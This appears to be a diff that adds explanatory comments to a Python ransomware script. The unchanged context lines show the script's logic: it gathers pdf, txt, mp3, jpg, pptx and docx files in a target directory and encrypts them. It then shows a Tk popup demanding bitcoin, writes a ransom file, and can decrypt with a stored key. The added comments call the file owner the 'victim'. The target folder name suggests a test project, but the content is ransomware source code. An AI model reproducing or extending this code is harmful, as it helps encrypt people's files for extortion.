@@ -7,7 +7,7 @@ from pathlib import Path
 
 encExtensions = ["pdf", "txt", "mp3", "jpg", "pptx", "docx"]
 
-#gets all file paths in a given directory
+#gets all file paths in a given directory and create two lists. A list of target files to encrypt, and a list of files that have been found with .encrypted extension
 def getFilePaths(targetDir):
     regFilePaths = []
     encFilePaths = []
@@ -56,6 +56,7 @@ def encrypt(filePaths):
 
 #decrypts all files in "filePaths" list     
 def decrypt(filePaths):
+    #this needs to be changed to recieve key from user rather than a file
     with open("key.key", 'rb') as f:
             key = f.read()
             print(key)
@@ -81,10 +82,13 @@ def open_popup():
    top.title("Bitcoin address")
    Label(top, text= "Please send bitcoin to the address below.", font=('Mistral 18 bold')).place(x=150,y=80)
 
-
+#directory to be encrypted or decrypted
 targetDir = "./myTest"
+#this will scan through target directory and creates two lists, a list of files with target extensions, and a list of files with .ecrypted extension.
+#If a file with .encrypted is found, the encrypted flag is set to show data has already been encrypted.
 regFilePaths, encFilePaths, encryptedFlag = getFilePaths(targetDir)
 
+#if data has not been encrypted
 if (encryptedFlag == 0):
     encrypt(regFilePaths)
     win = Tk()
@@ -97,6 +101,7 @@ if (encryptedFlag == 0):
     f.write("Ransom, Ransom")
     f.close()
 
+#if data has been encrypted. This should also check for the key from the victim.
 elif (encryptedFlag == 1):
     decrypt(encFilePaths)
 
